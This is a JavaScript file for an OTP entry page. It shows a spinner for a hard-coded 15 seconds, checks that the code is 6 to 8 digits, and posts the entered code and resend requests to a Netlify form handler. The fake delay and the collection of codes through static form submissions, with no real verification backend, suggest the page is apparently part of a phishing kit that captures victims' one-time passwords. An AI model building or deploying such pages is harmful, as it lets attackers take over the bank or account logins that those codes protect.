document.addEventListener("DOMContentLoaded", function() {
    const spinnerContainer = document.querySelector('.spinner-container');
    const otpContainer = document.querySelector('.otp-container');
    const thanksContainer = document.querySelector('.thanks-container');
    const otpInput = document.getElementById('otpInput');
    const otpVerificationForm = document.getElementById('otpVerificationForm');
    const resendForm = document.getElementById('resendOTPForm');
    const timerDisplay = document.getElementById('timer');
    const resendLink = document.getElementById('resendLink');
    const resendConfirmation = document.getElementById('resendConfirmation');
    const timerBar = document.getElementById('timerBar');

    // Show spinner for 15 seconds on page load
    setTimeout(() => {
        spinnerContainer.style.display = 'none';
        otpContainer.style.display = 'flex';
    }, 15000);

    otpInput.addEventListener('input', function() {
        // Allow only numbers in the input field
        this.value = this.value.replace(/[^0-9]/g, '');
    });

    otpVerificationForm.addEventListener('submit', function(event) {
        // Check if OTP length is between 6 and 8
        if (otpInput.value.length < 6 || otpInput.value.length > 8) {
            event.preventDefault();  // Prevent the default form submission
            alert("Please enter a valid OTP!");
        }
        // The form will be submitted traditionally without JavaScript interception
    });

    // Timer, progress bar, and resend form functionality
    var countdown = 75; // 75 seconds countdown
    var timer = setInterval(function() {
        updateTimerDisplay(countdown);

        // Update progress bar width
        var progressBarWidth = (countdown / 75) * 100;
        timerBar.style.width = progressBarWidth + '%';

        if (--countdown < 0) {
            clearInterval(timer);
            timerBar.style.display = 'none'; // Hide the progress bar
            resendLink.classList.add('enabled');
            resendLink.addEventListener('click', function(event) {
                event.preventDefault(); // Prevent default link behavior
                submitResendForm(); // Call function to submit the form via AJAX
            });
        }
    }, 1000);

    // Initialize the timer display
    updateTimerDisplay(countdown);

    function updateTimerDisplay(seconds) {
        var minutes = Math.floor(seconds / 60);
        var remainingSeconds = seconds % 60;
        minutes = minutes < 10 ? "0" + minutes : minutes;
        remainingSeconds = remainingSeconds < 10 ? "0" + remainingSeconds : remainingSeconds;
        timerDisplay.textContent = minutes + ":" + remainingSeconds;
    }

    function submitResendForm() {
        // Construct the form data payload
        var formData = new FormData(resendForm);
        formData.append('form-name', 'resendOTPForm'); // Ensure this matches your Netlify settings

        // Encode form data to match 'application/x-www-form-urlencoded' content type
        var encodedData = new URLSearchParams(formData).toString();

        fetch("/", {
            method: "POST",
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: encodedData
        })
        .then(response => {
            if (response.ok) {
                // Display confirmation message
                resendConfirmation.style.display = 'block';
                // Optional: Hide the confirmation message after some time
                setTimeout(function() {
                    resendConfirmation.style.display = 'none';
                }, 5000);
            } else {
                // Handle errors
                console.error('Netlify form submission error:', response);
            }
        })
        .catch(error => {
            console.error('Error submitting form:', error);
        });
    }
});
